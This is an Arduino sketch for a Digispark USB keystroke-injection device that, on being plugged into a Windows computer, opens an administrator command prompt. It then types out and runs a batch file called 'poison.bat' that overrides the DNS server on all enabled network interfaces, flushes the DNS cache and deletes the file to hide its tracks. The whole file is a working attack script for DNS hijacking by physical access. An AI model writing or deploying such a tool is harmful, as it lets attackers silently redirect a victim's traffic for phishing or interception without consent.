#include "DigiKeyboard.h"

#define DNS_SERVER "8.8.8.8"
#define DELAY 500

void setup()
{
    // Setup LED
    pinMode(0, OUTPUT); // LED on model B 
    pinMode(1, OUTPUT); // LED on model A
    digitalWrite(0, HIGH);
    digitalWrite(1, HIGH);

    // Run the hack
    poison();
}

void poison()
{
    // Windows Key + R to open Run
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(DELAY*2);

    // Open the cmd as administrator
    DigiKeyboard.print("cmd");
    DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT);
    DigiKeyboard.delay(DELAY*2);
    DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
    DigiKeyboard.delay(DELAY);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(DELAY);
  
    // Create the .bat file and open it with notepad
    DigiKeyboard.println("echo. > poison.bat");
    DigiKeyboard.println("notepad poison.bat");
    delay(DELAY);

    // Write the script
    DigiKeyboard.println("@ECHO OFF");
    DigiKeyboard.println("set DNS=" DNS_SERVER);
    DigiKeyboard.println("for /f \"tokens=1,2,3*\" %%i in ('netsh int show interface') do (");
    DigiKeyboard.println("  if %%i equ Enabled (");
    DigiKeyboard.println("    netsh int ipv4 set dns name=\"%%l\" static %DNS% primary validate=no");
    DigiKeyboard.println("  )");
    DigiKeyboard.println(")");
    DigiKeyboard.println("ipconfig /flushdns");
    DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
    DigiKeyboard.delay(DELAY);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(DELAY);

    // Run and delete the script
    DigiKeyboard.println("poison.bat");
    delay(DELAY);
    DigiKeyboard.println("del poison.bat");

    // Close the console
    DigiKeyboard.println("exit");
}


void loop()
{
    // Blink the LED quickly after job done
    digitalWrite(0, HIGH);
    digitalWrite(1, HIGH);
    delay(200);
    digitalWrite(0, LOW);
    digitalWrite(1, LOW);
    delay(200);
}
